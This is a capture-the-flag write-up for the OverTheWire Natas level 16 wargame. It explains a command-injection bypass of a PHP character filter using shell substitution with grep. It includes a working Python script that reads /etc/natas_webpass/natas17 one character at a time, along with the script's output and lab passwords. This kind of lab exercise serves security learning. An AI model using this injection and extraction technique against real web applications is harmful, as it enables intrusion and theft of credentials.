+++
author = "Alex Domnit"
title = 'Natas-Level 17'
date = 2024-08-25T21:17:22+03:00
draft = true
description = "Writeup"
tags = [
    "CTF",
    "Completed",
]
categories = [
    "Overthewire",
    "Natas",
]

toc = false
+++

### Login
*Username: natas17*\
*Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC*\
*URL:      http://natas17.natas.labs.overthewire.org*

### Doc
[What is brute-forcing?](https://en.wikipedia.org/wiki/Brute-force_attack)\
In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.\
[What is python?](https://en.wikipedia.org/wiki/Python_(programming_language))\
Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.\
[What is php?](https://en.wikipedia.org/wiki/PHP)\
PHP is a general-purpose scripting language geared towards web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1993 and released in 1995. The PHP reference implementation is now produced by the PHP Group.

### Solution
We should examine the index page of **natas16** as per usual. There is a word search field just like in a previous letter and a search button.

<img src="/img/natas/natas16-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
<br>
<strong>Source code:</strong>

{{< highlight html >}}
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
{{< /highlight >}}
#### What does this code do?
The important selection out of all of that code is this: 
```
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
This code snippet submits the sent data from the <strong>natas16 index page</strong> and searches the dictionary.txt file in order to find matching words that contain the given pattern. There is also some illegal character filter in place in order to make PHP injection more difficult to perform. The sollution to this level will be extremly similar to that of <strong>natas15</strong> since we are gonna try data and use the response packets we get in order to filter out usefull data.
#### Grep documentation needed:
```
grep (1)             - print lines that match patterns
    -E, --extended-regexp     PATTERNS are extended regular expressions
```
We are gonna do an extended regex in order to fill out characters in the password for <strong>natas17</strong> in conjunction with a word that we know is present in the <strong>dictionary.txt</strong> file, then if the response contains the word, we know that the selected character is in the password, otherwise not.
#### Grep format:
```
$(grep -E ^ string/character.* /etc/natas_webpass/natas17)Existing_key
```
We need to find a string that appears in <strong>dictionary.txt</strong>:

<img src="/img/natas/natas16-2.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
<br>
Now all that is left to do is implement this in a python script just like we did previously.

#### The script:
```
import requests

target = 'http://natas16.natas.labs.overthewire.org'
possible = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


final = ''
i = 0
while len(final) != 32:
	while i < len(possible):
		character = possible[i]
		needle = ('$(grep -E ^%s%c.* /etc/natas_webpass/natas17)abandoned' % (final, character))
		req = requests.get(target,
			auth=('natas16','hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'),
			params={"needle": needle}
		)
		if "abandoned" not in req.text:
			final += character
			print ('Password so far : ' + final)
			i = 0
		else:
			i += 1
print ("----Script Finished----")
print ("Password is : " + final)
```
Now all that is left to do is run the script and obtain the password for <strong>natas17</strong>.
#### Script run:
```
02:59:31 archie@Archie python → python3 scriptnatas16.py
Password so far : E
Password so far : Eq
Password so far : Eqj
Password so far : EqjH
Password so far : EqjHJ
Password so far : EqjHJb
Password so far : EqjHJbo
Password so far : EqjHJbo7
Password so far : EqjHJbo7L
Password so far : EqjHJbo7LF
Password so far : EqjHJbo7LFN
Password so far : EqjHJbo7LFNb
Password so far : EqjHJbo7LFNb8
Password so far : EqjHJbo7LFNb8v
Password so far : EqjHJbo7LFNb8vw
Password so far : EqjHJbo7LFNb8vwh
Password so far : EqjHJbo7LFNb8vwhH
Password so far : EqjHJbo7LFNb8vwhHb
Password so far : EqjHJbo7LFNb8vwhHb9
Password so far : EqjHJbo7LFNb8vwhHb9s
Password so far : EqjHJbo7LFNb8vwhHb9s7
Password so far : EqjHJbo7LFNb8vwhHb9s75
Password so far : EqjHJbo7LFNb8vwhHb9s75h
Password so far : EqjHJbo7LFNb8vwhHb9s75ho
Password so far : EqjHJbo7LFNb8vwhHb9s75hok
Password so far : EqjHJbo7LFNb8vwhHb9s75hokh
Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5
Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5T
Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF
Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0
Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0O
Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
----Script Finished----
Password is : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```